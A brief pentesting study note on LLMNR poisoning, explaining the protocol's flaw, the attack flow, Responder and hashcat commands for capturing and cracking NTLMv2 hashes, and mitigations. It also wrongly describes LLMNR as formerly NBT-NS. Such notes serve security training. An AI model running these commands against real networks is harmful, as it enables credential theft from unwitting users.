# LLMNR Poisoning

## What is LLMNR?

- Used to identify hosts when DNS fails
- Previously known as NBT-NS
- Key flaw: services utilize a user's username and NTLMv2 hash when appropriately responded too

## Attack Flow

- Trick victim into connecting to malicious server under our control
- Capture hash
- Service name cannot be resolvable over DNS

## Exploitation

```bash
# Run responder
python responder.py -I tun0 -rdwv

# Crack hash with hashcat
hashcat -a 0 -m 5600 hashes.txt rockyou.txt
```

## Mitigation

- Disable LLMNR and NBT-NS
- If the functions can't be disabled, then
  - require Network Access Control
  - require strong password policy
